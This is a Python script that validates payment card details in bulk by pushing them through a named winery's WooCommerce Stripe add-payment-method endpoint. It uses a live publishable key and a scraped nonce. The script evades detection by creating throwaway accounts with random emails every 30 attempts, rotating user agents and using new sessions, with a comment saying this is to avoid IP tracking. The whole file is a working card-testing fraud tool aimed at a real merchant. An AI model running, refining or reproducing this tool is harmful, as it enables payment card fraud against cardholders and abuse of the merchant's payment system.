import requests
import random
import string
from fake_useragent import UserAgent

REGISTER_URL = "https://jamesrivercellars.com/my-account/"
PAYMENT_URL = "https://jamesrivercellars.com/my-account/add-payment-method/"
PAYMENT_LIMIT = 30
payment_count = 0

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_email():
    return f"{generate_random_string()}@gmail.com"

def generate_random_username():
    return f"user_{generate_random_string(8)}"

def register_new_account():
    """Registers a new account with a random username and email, using a new session each time."""
    session = requests.Session()
    user_agent = UserAgent().random
    headers = {"User-Agent": user_agent, "Referer": REGISTER_URL}

    email = generate_random_email()
    username = generate_random_username()
    
    data = {
        "email": email,
        "username": username
    }

    try:
        response = session.post(REGISTER_URL, headers=headers, data=data)
        if response.status_code == 200:
            print(f"[+] Registered new account: {email} | {username}")
            return session
        else:
            print(f"[-] Registration failed: {response.text}")
            return None
    except Exception as e:
        print(f"Error during registration: {e}")
        return None

def Tele(ccx):
    """Handles card processing while ensuring new accounts are registered after a set limit."""
    global payment_count

    session = requests.Session()  # Always use a new session to avoid IP tracking
    user_agent = UserAgent().random

    if payment_count >= PAYMENT_LIMIT:
        session = register_new_account()
        if session is None:
            return {"error": "Account registration failed."}
        payment_count = 0

    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {"error": "Invalid card format. Expected format: xxxx|mm|yy|cvc"}

    if yy.startswith("20"):
        yy = yy[2:]

    headers = {
        "User-Agent": user_agent,
        "Referer": PAYMENT_URL
    }

    data = {
        "type": "card",
        "card[number]": n,
        "card[cvc]": cvc,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "key": "pk_live_517y6z9G8rUZBnRPeKEqJOQdtTP6fbnfQKNishXmVrHZncrqMioM1X58G2zFGaQexOY8yYQqgJws2TmAJFLGg11sy009KfDB1X7",
        "_stripe_version": "2024-06-20"
    }

    try:
        response = session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers)
        stripe_id = response.json().get("id")

        if not stripe_id:
            return {"error": "Failed to retrieve Stripe ID.", "response": response.json()}

        response_nonce = session.get(PAYMENT_URL, headers=headers)
        nonce = response_nonce.text.split(',"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]

        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': stripe_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response_final = session.post(
            "https://jamesrivercellars.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers, data=data
        )

        payment_count += 1
        return response_final.json()

    except Exception as e:
        return {"error": f"Request failed: {e}"}